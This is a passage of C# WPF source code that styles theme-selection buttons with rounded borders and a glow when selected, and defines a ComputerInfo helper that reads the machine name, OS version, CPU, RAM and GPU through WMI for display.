                BtnThemePink.Template = GetThemeButtonTemplate(false, BtnThemePink.Background);
                BtnThemePurple.Template = GetThemeButtonTemplate(false, BtnThemePurple.Background);
                BtnThemeGreen.Template = GetThemeButtonTemplate(false, BtnThemeGreen.Background);
                BtnThemeOrange.Template = GetThemeButtonTemplate(false, BtnThemeOrange.Background);
                
                // Add stroke to selected button
                btn.Template = GetThemeButtonTemplate(true, btn.Background);
            }
        }
        
        private ControlTemplate GetThemeButtonTemplate(bool selected, Brush bgBrush)
        {
            var template = new ControlTemplate(typeof(Button));
            var border = new FrameworkElementFactory(typeof(Border));
            border.SetBinding(Border.BackgroundProperty, new System.Windows.Data.Binding("Background") { RelativeSource = new System.Windows.Data.RelativeSource(System.Windows.Data.RelativeSourceMode.TemplatedParent) });
            border.SetValue(Border.CornerRadiusProperty, new CornerRadius(24));
            border.SetValue(Border.BorderThicknessProperty, selected ? new Thickness(2) : new Thickness(0));
            border.SetValue(Border.BorderBrushProperty, selected ? System.Windows.Media.Brushes.White : System.Windows.Media.Brushes.Transparent);
            
            if (selected)
            {
                var shadow = new System.Windows.Media.Effects.DropShadowEffect
                {
                    Color = ((SolidColorBrush)bgBrush).Color,
                    BlurRadius = 20,
                    ShadowDepth = 0,
                    Opacity = 0.8
                };
                border.SetValue(Border.EffectProperty, shadow);
            }
            
            template.VisualTree = border;
            return template;
        }
    }

    // ── PC Info ─────────────────────────────────────────────────────────────
    public static class ComputerInfo
    {
        public static string GetName() => Environment.MachineName;
        public static string GetOS() => Environment.OSVersion.VersionString;

        public static string GetCPU()
        {
            try
            {
                using var s = new ManagementObjectSearcher("SELECT Name FROM Win32_Processor");
                foreach (var o in s.Get())
                    return o["Name"]?.ToString()?.Trim() ?? "—";
            }
            catch { }
            return "—";
        }

        public static string GetRAM()
        {
            try
            {
                using var s = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
                foreach (var o in s.Get())
                {
                    var b = Convert.ToInt64(o["TotalPhysicalMemory"]);
                    return $"{b / (1024 * 1024 * 1024.0):F1} GB";
                }
            }
            catch { }
            return "—";
        }

        public static string GetGPU()
        {
            try
            {
                using var s = new ManagementObjectSearcher("SELECT Name FROM Win32_VideoController");
                var gpus = new System.Collections.Generic.List<string>();
                foreach (var o in s.Get())
                {
                    var n = o["Name"]?.ToString()?.Trim();
                    if (!string.IsNullOrEmpty(n)) gpus.Add(n);
                }
                return gpus.Count > 0 ? string.Join(", ", gpus) : "—";
            }
            catch { }
            return "—";
        }
    }
}
